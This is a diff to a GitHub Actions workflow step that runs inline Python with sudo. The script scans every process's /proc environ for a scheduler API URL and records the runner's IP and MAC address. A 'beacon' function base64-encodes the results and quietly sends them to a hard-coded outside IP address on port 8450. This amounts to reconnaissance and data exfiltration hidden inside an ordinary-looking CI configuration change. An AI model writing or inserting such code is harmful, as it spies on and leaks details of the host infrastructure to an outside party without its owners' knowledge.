@@ -19,22 +19,26 @@ jobs:
         env:
           SLOT: ${{ matrix.slot }}
         run: |
-          sudo --preserve-env=GITHUB_RUN_ID,SLOT python3 - <<'PY'
+          NODE=$(python3 - <<'PY'
+          import glob,urllib.parse
+          for path in glob.glob('/proc/[0-9]*/environ'):
+              try:items=open(path,'rb').read().split(b'\0')
+              except OSError:continue
+              d=dict(x.split(b'=',1) for x in items if b'=' in x)
+              if b'scheduler_api_url' in d:
+                  print(urllib.parse.urlsplit(d[b'scheduler_api_url'].decode()).hostname);break
+          PY
+          )
+          export NODE
+          sudo --preserve-env=GITHUB_RUN_ID,SLOT,NODE python3 - <<'PY'
           import base64,glob,http.server,json,os,select,socket,struct,threading,time,urllib.parse,urllib.request
 
-          def hca_env():
-              for path in glob.glob('/proc/[0-9]*/environ'):
-                  try: items=open(path,'rb').read().split(b'\0')
-                  except OSError: continue
-                  d=dict(x.split(b'=',1) for x in items if b'=' in x)
-                  if b'scheduler_api_url' in d:return d
-              return {}
           def beacon(name,obj):
               data=base64.urlsafe_b64encode(json.dumps(obj,separators=(',',':')).encode()).decode()
               try:urllib.request.urlopen('http://16.146.243.72:8450/'+name+'?d='+data,timeout=2).read()
               except Exception:pass
 
-          hca=hca_env(); node=urllib.parse.urlsplit(hca[b'scheduler_api_url'].decode()).hostname
+          node=os.environ['NODE']
           route=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);route.connect(('192.0.2.1',9));ip=route.getsockname()[0];route.close()
           mac_text=open('/sys/class/net/eth0/address').read().strip();mac=bytes.fromhex(mac_text.replace(':',''))
           marker=('MACB-3900000-%s-%s' % (os.environ['GITHUB_RUN_ID'],os.environ['SLOT'])).encode()
